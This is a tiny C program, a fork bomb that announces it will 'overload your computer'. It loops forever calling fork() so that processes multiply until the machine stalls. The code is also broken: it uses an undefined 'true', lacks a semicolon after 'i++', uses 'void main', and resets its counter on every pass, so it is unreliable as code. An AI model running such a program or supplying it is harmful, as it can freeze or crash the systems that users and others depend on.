#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

void main(void) {
	printf("This is a program that will overload your computer\n");
	while (true) {
		int i = 0;
		printf("fork %d\n", i);
		fork();
		i++
	}
}
